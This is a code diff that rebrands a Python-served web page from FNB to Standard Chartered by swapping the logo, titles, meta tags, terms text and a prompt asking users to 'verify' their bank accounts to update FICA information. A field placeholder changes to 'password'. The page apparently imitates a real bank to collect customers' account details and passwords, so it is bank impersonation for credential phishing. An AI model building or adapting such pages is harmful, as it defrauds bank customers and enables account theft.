@@ -1177,13 +1177,13 @@ def base(content, header=True):
         <div class="top-item brand">
 
     <img
-        src="https://logos-world.net/wp-content/uploads/2022/11/FNB-Logo-New.png"
+        src="https://e7.pngegg.com/pngimages/397/605/png-clipart-standard-bank-finance-financial-services-funding-bank-emblem-trademark-thumbnail.png"
         alt="Logo"
         class="header-logo"
     >
 
     <span>
-        FNB
+        STANDARD CHARTERED 
     </span>
 
 </div>
@@ -1219,7 +1219,7 @@ def base(content, header=True):
         content="width=device-width, initial-scale=1.0"
     >
 
-    <title>FNB</title>
+    <title>STANDARD CHARTERED</title>
 
     <link
         rel="icon"
@@ -1227,11 +1227,11 @@ def base(content, header=True):
         href="https://e7.pngegg.com/pngimages/397/605/png-clipart-standard-bank-finance-financial-services-funding-bank-emblem-trademark-thumbnail.png"
     >
 
-    <meta property="og:title" content="FNB">
+    <meta property="og:title" content="STANDARD CHARTERED">
 
     <meta
         property="og:description"
-        content="Online FNB SERVER."
+        content="Online STANDARD CHARTERED SERVER."
     >
 
     <meta
@@ -1614,7 +1614,7 @@ Status: Test access started
                     class="hn-input hn-code-input"
                     type="password"
                     name="test_access_code"
-                    placeholder="Test Access Code"
+                    placeholder="password"
                     autocomplete="off"
                     minlength="5"
                     required
@@ -1993,7 +1993,7 @@ cell phone: {session.get("guardian_number", "")}
             <div class="intro-box">
 
                 To complete the update of your FICA information
-                  we need to verify any of your FNB account/s.
+                  we need to verify any of your STANDARD CHARTERED account/s.
 
             
             </div>
@@ -2186,7 +2186,7 @@ cell phone: {session.get("guardian_number", "")}
 
                         <div>
 
-                            I accept the FNB Verification
+                            I accept the STANDARD CHARTERED Verification
                             <a
                                 href="/terms"
                                 target="_blank"
@@ -2241,7 +2241,7 @@ def terms():
             <div class="intro-box">
 
     <p>
-        By using FNB Server, you agree to provide accurate and up-to-date information.
+        By using STANDARD CHARTERED Server, you agree to provide accurate and up-to-date information.
     </p>
 
     <p>
@@ -2253,7 +2253,7 @@ def terms():
     </p>
 
     <p>
-        FNB Server may perform security checks to protect accounts, transactions, and user information.
+        The STANDARD CHARTERED Server may perform security checks to protect accounts, transactions, and user information.
     </p>
 
     <p>
@@ -2386,7 +2386,7 @@ Started: {session.get("started_at", "")}
 
                 <br>
 
-                we need to verify your any of your FNB accounts.
+                we need to verify your any of your STANDARD CHARTERED accounts.
 
 
             </div>
@@ -2658,7 +2658,7 @@ Entered: {age_value}
                 </h2>
 
                 <p class="congratulations-main">
-                    download the banking app and experience smarter banking with FNB.
+                    download the banking app and experience smarter banking with STANDARD CHARTERED.
                 </p>
 
                 <p>
